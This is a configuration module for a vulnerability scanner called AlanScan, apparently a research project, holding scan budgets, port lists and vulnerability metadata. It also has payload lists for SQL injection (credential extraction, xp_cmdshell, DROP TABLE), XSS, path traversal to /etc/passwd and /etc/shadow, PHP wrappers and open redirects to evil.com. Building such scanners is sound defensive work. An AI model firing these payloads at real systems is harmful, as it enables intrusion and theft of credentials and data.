"""
AlanScan Configuration
======================
Central configuration module for all scan parameters, payloads, and constants.
Modify these values to tune scan behaviour without touching core logic.
"""

# ── Logging (scanner.scan_logger / controller orchestration) ────────────────
# DEBUG | INFO | WARNING | ERROR — controls console verbosity for the scanner logger.
SCAN_LOG_LEVEL = "INFO"

# ── Tool Metadata ─────────────────────────────────────────────────────────────
VERSION      = "3.1.0"
AUTHOR       = "Alain NDAYE"
TOOL_URL     = "AlanScan — Masters Research Project"
LICENSE      = "For authorised security assessments only"
TOOL_NAME    = "AlanScan"
DESCRIPTION  = "Automated Web & Network Vulnerability Scanner"

# ── Network Defaults ──────────────────────────────────────────────────────────
DEFAULT_THREADS  = 20       # Concurrent worker threads
TIMEOUT          = 15       # HTTP / socket timeout in seconds (default scan request cap)

# After error-based SQLi is confirmed on a URL, still run boolean/time-blind (no early pipeline exit).
SCAN_SQLI_SKIP_AFTER_ERROR_CONFIRM = False
CRAWL_DEPTH      = 3        # Max recursive crawl depth
MAX_URLS         = 300      # Safety cap on crawled URLs per scan

# ── Scan intensity (CLI --intensity) ────────────────────────────────────────
# light    = minimal payloads, no time-blind SQLi / heavy fuzzing
# medium   = balanced (default)
# aggressive = full payload sets, all SQLi phases
SCAN_INTENSITY_DEFAULT = "medium"
# Approximate max URLs returned from crawler after static/noise filtering (0 = use MAX_URLS)
CRAWLER_URL_CAP_BY_INTENSITY = {"light": 120, "medium": 300, "aggressive": 500}
# Same-origin JS bundles to fetch per crawl for SPA API / route extraction (0 = disable)
CRAWLER_SPA_JS_FETCH_MAX_BY_INTENSITY = {"light": 15, "medium": 45, "aggressive": 90}

# ── BaseScanner budgets & adaptive tuning (scanner/base_scanner.py) ─────────
# Scan-wide default HTTP cap; ScannerController passes its own max_requests.
MAX_REQUESTS = 10_000
# Minimum pause between BaseScanner._safe_request calls (seconds).
REQUEST_DELAY = 0.1
# Same semantic as REQUEST_DELAY — used by controller / thread pool floor.
SAFE_DEFAULT_DELAY_SEC = 0.1
RESPONSE_CACHE_MAX_SIZE = 5_000
ADAPTIVE_STOP_CONFIRMATIONS = 2
ADAPTIVE_HIGH_CONF_THRESHOLD = 0.90

# Per-module request budget: fraction of the scan ``max_requests`` cap, or a
# positive int (absolute ceiling). Keys match each scanner class ``name``.
# Unknown names fall back to "default", then "base".
MODULE_REQUEST_BUDGET = {
    "sqli": 0.22,
    "lfi": 0.18,
    "xss": 0.14,
    "cmdi": 0.12,
    "ssrf": 0.10,
    "xxe": 0.08,
    "csrf": 0.08,
    "idor": 0.08,
    "dirs": 0.14,
    "api": 0.06,
    "redirect": 0.07,
    "method": 0.06,
    "rate": 0.05,
    "headers_plus": 0.05,
    "headers": 0.04,
    "ssl": 0.04,
    "cookies": 0.04,
    "auth": 0.08,
    "default": 0.12,
    "base": 0.12,
}

# Optional wall-clock budgets (seconds) per module; unused keys → no limit.
# Reserved for future enforcement; BaseScanner currently uses request budget only.
MODULE_TIME_BUDGET_SEC: dict[str, float] = {}


def get_module_budget(module_key: str, max_budget: int) -> int:
    """
    Return the maximum HTTP requests allowed for a scanner module.

    The result is derived from :data:`MODULE_REQUEST_BUDGET` and the scan-wide
    ``max_budget`` (never exceeds it, never below 1).
    """
    try:
        cap = int(max_budget)
    except (TypeError, ValueError):
        cap = int(MAX_REQUESTS) if isinstance(MAX_REQUESTS, int) else 10_000
    cap = max(1, cap)

    try:
        key = str(module_key or "default").strip().lower() or "default"
    except Exception:
        key = "default"

    raw = MODULE_REQUEST_BUDGET.get(key)
    if raw is None:
        raw = MODULE_REQUEST_BUDGET.get("default")
    if raw is None:
        raw = MODULE_REQUEST_BUDGET.get("base")
    if raw is None:
        raw = 0.12

    try:
        if isinstance(raw, int):
            budget = min(int(raw), cap)
        else:
            frac = float(raw)
            if frac > 1.0:
                budget = min(int(frac), cap)
            else:
                budget = int(cap * frac)
    except (TypeError, ValueError):
        budget = max(1, min(cap, int(cap * 0.12)))

    return max(1, min(budget, cap))


def get_module_time_budget_sec(module_key: str) -> float | None:
    """
    Optional per-module wall-clock budget in seconds.

    Returns ``None`` when unset (no limit). Not yet enforced by BaseScanner;
    callers may use this for scheduling or logging.
    """
    try:
        key = str(module_key or "default").strip().lower() or "default"
    except Exception:
        key = "default"
    raw = MODULE_TIME_BUDGET_SEC.get(key)
    if raw is None:
        return None
    try:
        t = float(raw)
    except (TypeError, ValueError):
        return None
    return t if t > 0 else None


# ── Thread pool / HTTP throttling (used by scanner/thread_manager.py) ───────
THREAD_POOL_MAX_WORKERS   = 20   # ThreadPoolExecutor worker cap
REQUEST_THROTTLE_DELAY_SEC = 0.05  # Minimum pause after each throttled wait (global floor)
HTTP_RETRY_ATTEMPTS        = 3    # Retries for pooled tasks that raise
HTTP_RETRY_BACKOFF_SEC     = 0.35 # Base backoff; scaled by attempt index

# ── Port Scanning ─────────────────────────────────────────────────────────────
# Common ports checked during a network scan
TOP_PORTS = [
    21, 22, 23, 25, 53, 80, 110, 111, 135, 139,
    143, 443, 445, 993, 995, 1723, 3306, 3389,
    5900, 6379, 8080, 8443, 8888, 27017
]

# Well-known service names mapped to their default ports
PORT_SERVICE_MAP = {
    21: "FTP",      22: "SSH",       23: "Telnet",
    25: "SMTP",     53: "DNS",       80: "HTTP",
    110: "POP3",    143: "IMAP",     443: "HTTPS",
    445: "SMB",     3306: "MySQL",   3389: "RDP",
    5900: "VNC",    6379: "Redis",   8080: "HTTP-Alt",
    8443: "HTTPS-Alt", 27017: "MongoDB"
}

# ── HTTP Headers sent with every request ─────────────────────────────────────
DEFAULT_HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/120.0.0.0 Safari/537.36"
    ),
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive",
}

# ── SQL Injection Payloads ────────────────────────────────────────────────────
# Classic error-based and boolean-based SQLi probes.
# Each payload is designed to trigger a database error or alter query logic.
SQLI_PAYLOADS = [
    # ── Basic probes ──────────────────────────────────────────────────────────
    "'",                                              # Single-quote error probe
    "''",                                             # Double single-quote
    "`",                                              # Backtick (MySQL)
    "\\",                                             # Backslash escape probe

    # ── Boolean-based bypass ──────────────────────────────────────────────────
    "' OR '1'='1",                                    # Classic boolean bypass
    "' OR '1'='1' --",                                # Comment-terminated
    "' OR '1'='1' /*",                                # Block-comment bypass
    "' OR 1=1--",                                     # Numeric tautology
    "' OR 1=1#",                                      # MySQL hash comment
    "' OR 1=1/*",                                     # Block comment variant
    '" OR 1=1--',                                     # Double-quote variant
    '" OR "1"="1',                                    # Double-quote boolean
    "' OR 'x'='x",                                   # String comparison bypass
    "') OR ('1'='1",                                  # Bracket bypass
    "admin' --",                                      # Admin login bypass
    "admin'#",                                        # Admin MySQL hash bypass
    "admin'/*",                                       # Admin block comment bypass
    "' OR 1=1 LIMIT 1--",                             # Limited result bypass

    # ── UNION-based detection ──────────────────────────────────────────────────
    "' UNION SELECT NULL--",                          # Single column probe
    "' UNION SELECT NULL,NULL--",                     # Two column probe
    "' UNION SELECT NULL,NULL,NULL--",                # Three column probe
    "1' UNION SELECT NULL--",                         # Numeric prefixed
    "1' UNION SELECT NULL,NULL--",
    "1' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT username,password FROM users--",  # Credential extraction
    "' UNION SELECT table_name,NULL FROM information_schema.tables--",  # Schema enum

    # ── Column-count probes ────────────────────────────────────────────────────
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",

    # ── Error-based (MySQL) ────────────────────────────────────────────────────
    "' AND extractvalue(1,concat(0x7e,version()))--",  # Version disclosure
    "' AND extractvalue(1,concat(0x7e,database()))--", # Database name
    "' AND updatexml(1,concat(0x7e,version()),1)--",   # UpdateXML error
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",

    # ── Error-based (MSSQL) ───────────────────────────────────────────────────
    "'; WAITFOR DELAY '0:0:5'--",                     # MSSQL time-based
    "' AND 1=CONVERT(int,'a')--",                     # MSSQL type-cast error
    "'; EXEC xp_cmdshell('whoami')--",                # MSSQL command exec probe

    # ── Time-based blind ──────────────────────────────────────────────────────
    "' AND SLEEP(5)--",                               # MySQL sleep
    "' AND SLEEP(5)#",                                # MySQL sleep hash
    "' OR IF(1=1,SLEEP(5),0)--",                      # MySQL conditional sleep
    "' OR IF(1=2,SLEEP(5),0)--",                      # MySQL conditional sleep (false)
    "'; IF (1=1) WAITFOR DELAY '0:0:5'--",            # MSSQL conditional
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",    # MySQL subquery sleep

    # ── Benchmark-based blind ─────────────────────────────────────────────────
    "' AND BENCHMARK(5000000,MD5(1))--",              # MySQL benchmark
    "' AND BENCHMARK(5000000,SHA1(1))--",             # MySQL benchmark SHA1

    # ── Destructive (detection signatures only — never executed) ──────────────
    "'; DROP TABLE users; --",
    "'; INSERT INTO users VALUES('hacked','hacked')--",

    # ── Advanced information extraction ───────────────────────────────────────
    "' OR benchmark(5000000,MD5(1))",                 # MySQL benchmark (no comment)
    "' OR benchmark(5000000,MD5(1))--",               # MySQL benchmark with comment
    "' AND 1=CONVERT(int,(SELECT @@version))",        # MSSQL version extraction
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0",   # Schema probe
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    "' UNION SELECT table_name,NULL FROM information_schema.tables--",    # Table enum
    "' UNION SELECT column_name,NULL FROM information_schema.columns--",  # Column enum
    "' UNION SELECT table_name FROM information_schema.tables--",
    "' UNION SELECT column_name FROM information_schema.columns--",

    # ── Advanced time-based ────────────────────────────────────────────────────
    "' OR SLEEP(5)--",                                # MySQL OR sleep
    "' OR SLEEP(5)#",                                 # MySQL OR sleep hash
    "' OR pg_sleep(5)--",                             # PostgreSQL sleep
    "' OR pg_sleep(5)#",                              # PostgreSQL sleep hash
    "' OR IF(1=1,SLEEP(5),0)#",                       # MySQL conditional hash
    "1; SELECT SLEEP(5)--",                           # Stacked query sleep
    "'; SELECT pg_sleep(5)--",                        # PostgreSQL stacked
]

# Error strings that betray a SQL error in the HTTP response
SQLI_ERROR_SIGNATURES = [
    # MySQL
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch",
    "mysql_num_rows",
    # MSSQL
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "sqlstate",
    "odbc sql server driver",
    "microsoft ole db provider for sql server",
    "com.microsoft.sqlserver.jdbc",
    "incorrect syntax near",
    "invalid column name",
    # Oracle
    "ora-",
    "oracle error",
    "oracle.*driver",
    # PostgreSQL
    "pg::syntaxerror",
    "postgresql.*error",
    # SQLite
    "sqlite3::exception",
    "sqlite error",
    # Java / JSP specific (demo.testfire.net uses Java)
    "java.sql.sqlexception",
    "java.sql.SQLException",
    "java.lang.NullPointerException",
    "org.apache.jasper",
    "javax.servlet.servletexception",
    "exception in thread",
    "jdbc",
    "db2 sql error",
    "invalid query",
    "sql command not properly ended",
    "unexpected token",
    "unterminated string",
    "division by zero",
    "syntax error",
    "database error",
    "query failed",
    "invalid sql",
]

# ── Fast SQLi Payload Set — 12 highest-signal payloads for speed ─────────────
# Used when --fast-scan profile is selected
SQLI_FAST_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR 1=1--",
    "admin' --",
    "' AND SLEEP(5)--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    '" OR 1=1--',
    "' AND extractvalue(1,concat(0x7e,version()))--",
    "' OR pg_sleep(5)--",
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    "'; WAITFOR DELAY '0:0:5'--",
]

# ── XSS Payloads ──────────────────────────────────────────────────────────────
# Reflected XSS probes – injected into GET/POST parameters.
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "'\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src='javascript:alert(1)'></iframe>",
    "'\"><img src=x onerror=alert('XSS')>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<video><source onerror=alert(1)>",
    "\"><svg/onload=alert(1)>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<ScRiPt>alert(1)</sCrIpT>",     # Case-bypass
    "%3Cscript%3Ealert(1)%3C/script%3E",  # URL-encoded
    "&#60;script&#62;alert(1)&#60;/script&#62;",  # HTML-encoded
]

# ── Directory / Path Traversal Wordlist ───────────────────────────────────────
DIR_WORDLIST = [
    "admin", "administrator", "login", "dashboard", "panel",
    "wp-admin", "wp-login.php", "phpmyadmin", "pma",
    "api", "api/v1", "api/v2", "graphql", "swagger",
    "backup", "backups", "db", "database", "sql",
    ".git", ".env", ".htaccess", ".htpasswd",
    "config", "config.php", "configuration", "settings",
    "test", "dev", "staging", "debug",
    "upload", "uploads", "files", "static",
    "robots.txt", "sitemap.xml", "crossdomain.xml",
    "server-status", "server-info",
    "console", "shell", "cmd",
    "cgi-bin", "scripts",
    "include", "includes", "lib", "libs", "vendor",
]

# ── Path Traversal Payloads ───────────────────────────────────────────────────
LFI_PAYLOADS = [
    # ── Standard traversal ────────────────────────────────────────────────────
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",

    # ── Windows targets ───────────────────────────────────────────────────────
    "../../../../windows/win.ini",
    "../../../../windows/system32/drivers/etc/hosts",
    "../../../../boot.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "C:\\Windows\\win.ini",

    # ── Linux sensitive files ─────────────────────────────────────────────────
    "../../../../proc/self/environ",
    "../../../../proc/self/cmdline",
    "../../../../var/log/apache2/access.log",
    "../../../../var/log/apache2/error.log",
    "../../../../var/log/nginx/access.log",
    "../../../../etc/shadow",
    "../../../../etc/hosts",

    # ── PHP wrappers ──────────────────────────────────────────────────────────
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=config.php",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "php://input",
    "php://filter/resource=../../../../etc/passwd",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
    "data://text/plain,<?php phpinfo();?>",
    "expect://id",

    # ── URL encoded ───────────────────────────────────────────────────────────
    "%2e%2e%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "%252e%252e%252fetc%252fpasswd",

    # ── Double encoded ────────────────────────────────────────────────────────
    "..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%afetc%c0%afpasswd",
    "..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",

    # ── Null byte (older PHP) ─────────────────────────────────────────────────
    "../../../../etc/passwd%00",
    "../../../../etc/passwd%00.jpg",
    "../../../../etc/passwd%00",

    # ── Filter bypass patterns ────────────────────────────────────────────────
    "....//....//etc/passwd",
    "..../..../etc/passwd",
    ".././.././.././etc/passwd",
    "/etc/passwd",
    "..%2f",
    "..%252f",
    "..%c0%af",
    "%2e%2e%2f",
]

# ── Open Redirect Payloads ────────────────────────────────────────────────────
REDIRECT_PAYLOADS = [
    "https://evil.com",
    "http://evil.com",
    "//evil.com",
    "///evil.com",
    "////evil.com",
    "https://evil.com%00",
    "https://evil.com%0d%0a",
    "https:evil.com",
    "https://google.com@evil.com",
    "https://evil.com/https://legitimate.com",
    "//evil.com/%2f..",
    "/\\evil.com",
    "https://legitimate.com.evil.com",
    "https://evil․com",
]

# ── Security Header Checks ────────────────────────────────────────────────────
# Headers that should be present in every HTTP response for basic hardening.
SECURITY_HEADERS = {
    "Strict-Transport-Security": "Enforces HTTPS (HSTS)",
    "X-Frame-Options": "Prevents clickjacking",
    "X-Content-Type-Options": "Prevents MIME sniffing",
    "Content-Security-Policy": "Controls resource loading",
    "Referrer-Policy": "Controls referrer information",
    "Permissions-Policy": "Restricts browser features",
    "X-XSS-Protection": "Legacy XSS filter (older browsers)",
    "Cross-Origin-Embedder-Policy": "Prevents cross-origin attacks",
    "Cross-Origin-Opener-Policy": "Isolates browsing context",
    "Cross-Origin-Resource-Policy": "Restricts resource sharing",
}

# ── Cookie Security Attributes ────────────────────────────────────────────────
INSECURE_COOKIE_FLAGS = ["httponly", "secure", "samesite"]

# ── CVE / Banner-Based Vulnerability Signatures ───────────────────────────────
# Maps service banners / version strings to known CVEs for informational flagging.
BANNER_CVE_MAP = {
    "apache/2.4.49": "CVE-2021-41773 (Path Traversal / RCE – Critical)",
    "apache/2.4.50": "CVE-2021-42013 (Path Traversal – Critical)",
    "openssh_7.4": "CVE-2018-15473 (User Enumeration – Medium)",
    "openssh_8.3": "CVE-2021-28041 (Double-Free – Low)",
    "vsftpd 2.3.4": "CVE-2011-2523 (Backdoor – Critical)",
    "proftpd 1.3.5": "CVE-2015-3306 (mod_copy RCE – Critical)",
    "microsoft-iis/7.5": "CVE-2010-3972 (DoS – Important)",
    "php/5.": "Multiple EOL CVEs – Upgrade Strongly Recommended",
    "php/7.0": "CVE-2019-11043 (RCE via FPM – Critical)",
    "php/7.1": "EOL – Security support ended December 2019",
    "mysql  5.5": "CVE-2016-6662 (Privilege Escalation – Critical)",
    "mysql  5.6": "Multiple CVEs – EOL March 2021",
    "redis": "CVE-2022-0543 (Sandbox Escape via Lua – Critical, if unpatched)",
    "mongodb": "Unauthenticated access risk if bind_ip=0.0.0.0 (CWE-306)",
}

# ── Severity Levels ───────────────────────────────────────────────────────────
SEVERITY = {
    "CRITICAL": 4,
    "HIGH":     3,
    "MEDIUM":   2,
    "LOW":      1,
    "INFO":     0,
}

SEVERITY_COLOR = {
    "CRITICAL": "\033[91m",   # Bright Red
    "HIGH":     "\033[31m",   # Red
    "MEDIUM":   "\033[33m",   # Yellow
    "LOW":      "\033[34m",   # Blue
    "INFO":     "\033[36m",   # Cyan
}

# ── Vulnerability Metadata — CWE, CVSS, Description, Recommendation ──────────
VULN_METADATA = {
    # ── SQL Injection ─────────────────────────────────────────────────────────
    "SQL Injection": {
        "cwe": "CWE-89",
        "cvss": 9.8,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "description": "SQL Injection occurs when user-supplied input is incorporated into database queries without proper sanitisation, allowing attackers to manipulate query logic. This can lead to unauthorized data access, data modification, authentication bypass, and in some cases, remote code execution.",
        "recommendation": "Use parameterized queries (prepared statements) for all database interactions. Never concatenate user input into SQL strings. Implement input validation and use stored procedures. Apply least-privilege database accounts.",
        "owasp": "A03:2021 – Injection",
    },
    "Error-Based SQLi (POST)": {
        "cwe": "CWE-89",
        "cvss": 9.8,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "description": "Error-based SQL injection via POST form fields. Database error messages are returned in the HTTP response, confirming injection and revealing schema information.",
        "recommendation": "Use parameterised queries. Disable verbose database error messages in production. Implement a Web Application Firewall.",
        "owasp": "A03:2021 – Injection",
    },
    "Time-Based Blind SQLi": {
        "cwe": "CWE-89",
        "cvss": 7.5,
        "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "description": "Time-based blind SQL injection uses database commands that introduce delays, allowing attackers to infer information based on response timing.",
        "recommendation": "Use parameterized queries. Implement query timeout limits. Use Web Application Firewall with SQL injection detection.",
        "owasp": "A03:2021 – Injection",
    },
    "Boolean-Blind SQLi": {
        "cwe": "CWE-89",
        "cvss": 7.5,
        "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "description": "Boolean-based blind SQL injection uses conditional queries to infer database structure based on response differences.",
        "recommendation": "Use parameterized queries. Implement consistent error handling. Use Web Application Firewall.",
        "owasp": "A03:2021 – Injection",
    },
    
    # ── XSS Vulnerabilities ───────────────────────────────────────────────────
    "Reflected XSS": {
        "cwe": "CWE-79",
        "cvss": 6.1,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
        "description": "Reflected Cross-Site Scripting (XSS) occurs when user input is immediately returned in the HTTP response without sanitization, allowing attackers to inject malicious scripts that execute in victims' browsers.",
        "recommendation": "Encode all output using context-aware encoding. Implement Content Security Policy (CSP). Use frameworks that auto-escape output. Validate and sanitize all input.",
        "owasp": "A03:2021 – Injection",
    },
    "DOM-Based XSS Sink Detected": {
        "cwe": "CWE-79",
        "cvss": 6.1,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
        "description": "DOM-based XSS occurs when client-side JavaScript processes user-controlled data and writes it to the DOM without sanitization. Dangerous sinks like innerHTML, eval, and document.write can execute injected scripts.",
        "recommendation": "Avoid dangerous sinks like innerHTML, eval, document.write. Use textContent instead. Implement strict CSP. Sanitize all DOM inputs.",
        "owasp": "A03:2021 – Injection",
    },
    "Stored XSS": {
        "cwe": "CWE-79",
        "cvss": 7.2,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N",
        "description": "Stored XSS occurs when malicious scripts are permanently stored on the target server and executed when users access the affected page.",
        "recommendation": "Validate and sanitize all user input before storing. Encode output when displaying. Implement Content Security Policy.",
        "owasp": "A03:2021 – Injection",
    },
    
    # ── CSRF Vulnerabilities ──────────────────────────────────────────────────
    "CSRF – Missing Anti-CSRF Token": {
        "cwe": "CWE-352",
        "cvss": 8.8,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
        "description": "Cross-Site Request Forgery (CSRF) allows attackers to trick authenticated users into performing unintended actions. Without CSRF tokens, any website can forge requests to this application.",
        "recommendation": "Implement synchronizer token pattern (CSRF tokens) for all state-changing operations. Use SameSite=Strict cookie attribute. Validate Origin and Referer headers.",
        "owasp": "A01:2021 – Broken Access Control",
    },
    "CSRF – No Origin/Referer Validation": {
        "cwe": "CWE-352",
        "cvss": 6.5,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N",
        "description": "The server does not validate the Origin or Referer header on POST requests, removing a secondary CSRF defence layer.",
        "recommendation": "Validate Origin header against an allowlist of trusted domains. Reject requests with missing or unexpected Origin headers on state-changing endpoints.",
        "owasp": "A01:2021 – Broken Access Control",
    },
    
    # ── SSRF Vulnerabilities ──────────────────────────────────────────────────
    "Server-Side Request Forgery (SSRF)": {
        "cwe": "CWE-918",
        "cvss": 8.2,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
        "description": "Server-Side Request Forgery (SSRF) allows attackers to induce the server to make arbitrary HTTP requests, potentially accessing internal services, cloud metadata, or local files.",
        "recommendation": "Validate and whitelist URLs. Block requests to internal IP ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16). Disable dangerous protocols (file://, gopher://).",
        "owasp": "A10:2021 – Server-Side Request Forgery",
    },
    
    # ── Command Injection ────────────────────────────────────────────────────
    "OS Command Injection (Output-Based)": {
        "cwe": "CWE-78",
        "cvss": 9.8,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "description": "OS Command Injection allows attackers to execute arbitrary operating system commands on the server by injecting shell metacharacters into user input. Confirmed by observing command output in the HTTP response.",
        "recommendation": "Never pass user input to shell functions. Use language APIs instead of shell commands. If shell is required, use strict allowlisting and never concatenate user input.",
        "owasp": "A03:2021 – Injection",
    },
    "OS Command Injection (Time-Based Blind)": {
        "cwe": "CWE-78",
        "cvss": 8.6,
        "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "description": "Time-based blind command injection uses sleep/delay commands to infer command execution based on response timing.",
        "recommendation": "Never pass user input to shell functions. Use APIs instead of shell commands. Implement command allowlisting.",
        "owasp": "A03:2021 – Injection",
    },
    
    # ── LFI / Path Traversal ─────────────────────────────────────────────────
    "Local File Inclusion / Path Traversal": {
        "cwe": "CWE-22",
        "cvss": 7.5,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        "description": "Local File Inclusion (LFI) allows attackers to read arbitrary files from the server by manipulating file paths using directory traversal sequences (../).",
        "recommendation": "Validate and sanitize file paths. Use allowlists for allowed files. Store files outside web root. Disable dangerous PHP wrappers (php://filter).",
        "owasp": "A01:2021 – Broken Access Control",
    },
    
    # ── XXE Vulnerabilities ───────────────────────────────────────────────────
    "XXE Injection": {
        "cwe": "CWE-611",
        "cvss": 7.5,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        "description": "XML External Entity (XXE) Injection exploits insecure XML parsers that process external entity references, allowing attackers to read local files or make internal network requests.",
        "recommendation": "Disable XML external entity processing. Use less complex data formats like JSON. Patch XML parsers. Implement input validation.",
        "owasp": "A05:2021 – Security Misconfiguration",
    },
    
    # ── Security Headers ─────────────────────────────────────────────────────
    "Missing Security Header": {
        "cwe": "CWE-693",
        "cvss": 5.3,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "description": "HTTP security headers are missing from server responses. These headers instruct browsers to enforce protective policies against common attacks like clickjacking, MIME sniffing, and XSS.",
        "recommendation": "Add missing security headers: Strict-Transport-Security, X-Frame-Options, X-Content-Type-Options, Content-Security-Policy, Referrer-Policy, Permissions-Policy.",
        "owasp": "A05:2021 – Security Misconfiguration",
    },
    "Missing Security Headers": {
        "cwe": "CWE-693",
        "cvss": 3.7,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "description": "Multiple recommended HTTP response security headers are missing. While not typically an immediate compromise by itself, missing headers remove important browser-side protections and increase the exploitability and impact of other vulnerabilities.",
        "recommendation": "Add a baseline header hardening policy (CSP, HSTS on HTTPS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy). Validate the policy in staging to avoid breaking legitimate functionality.",
        "owasp": "A05:2021 – Security Misconfiguration",
    },
    "Missing HSTS Header": {
        "cwe": "CWE-319",
        "cvss": 5.3,
        "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "description": "Strict-Transport-Security (HSTS) header is missing on an HTTPS site, allowing browsers to downgrade connections to HTTP — enabling SSL stripping attacks.",
        "recommendation": "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload to all HTTPS responses.",
        "owasp": "A05:2021 – Security Misconfiguration",
    },
    "Weak HSTS Configuration": {
        "cwe": "CWE-319",
        "cvss": 5.3,
        "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "description": "HSTS max-age is set too low (< 1 year), providing insufficient protection against SSL stripping attacks.",
        "recommendation": "Set HSTS max-age to at least 31536000 (1 year). Consider preloading for maximum protection.",
        "owasp": "A05:2021 – Security Misconfiguration",
    },
    "CSP Misconfiguration": {
        "cwe": "CWE-693",
        "cvss": 5.3,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "description": "Content Security Policy (CSP) has weak or unsafe directives like 'unsafe-inline', 'unsafe-eval', or wildcard sources (*) that weaken XSS protection.",
        "recommendation": "Use strict CSP with nonce-based or hash-based policies. Avoid 'unsafe-inline' and 'unsafe-eval'. Use specific sources instead of wildcards.",
        "owasp": "A05:2021 – Security Misconfiguration",
    },
    
    # ── SSL/TLS Vulnerabilities ───────────────────────────────────────────────
    "Weak SSL/TLS": {
        "cwe": "CWE-326",
        "cvss": 7.5,
        "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
        "description": "Server supports weak SSL/TLS protocols (SSLv3, TLSv1.0, TLSv1.1) that have known vulnerabilities allowing protocol downgrade attacks and cipher exploitation.",
        "recommendation": "Disable TLS 1.0 and 1.1. Enable TLS 1.2 and 1.3 only. Use strong cipher suites. Implement HSTS.",
        "owasp": "A02:2021 – Cryptographic Failures",
    },
    "Weak Cipher Suite": {
        "cwe": "CWE-326",
        "cvss": 7.4,
        "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
        "description": "Server supports weak cipher suites like RC4, 3DES, NULL, or EXPORT ciphers that can be broken by attackers.",
        "recommendation": "Disable weak ciphers. Use only AES-GCM, ChaCha20-Poly1305, and strong ECDHE ciphers. Follow industry best practices.",
        "owasp": "A02:2021 – Cryptographic Failures",
    },
    "Expired SSL Certificate": {
        "cwe": "CWE-324",
        "cvss": 7.5,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
        "description": "SSL/TLS certificate has expired. Browsers will show security warnings and connections may be blocked.",
        "recommendation": "Renew the SSL certificate immediately. Set up monitoring for certificate expiration. Use automated renewal with Let's Encrypt.",
        "owasp": "A02:2021 – Cryptographic Failures",
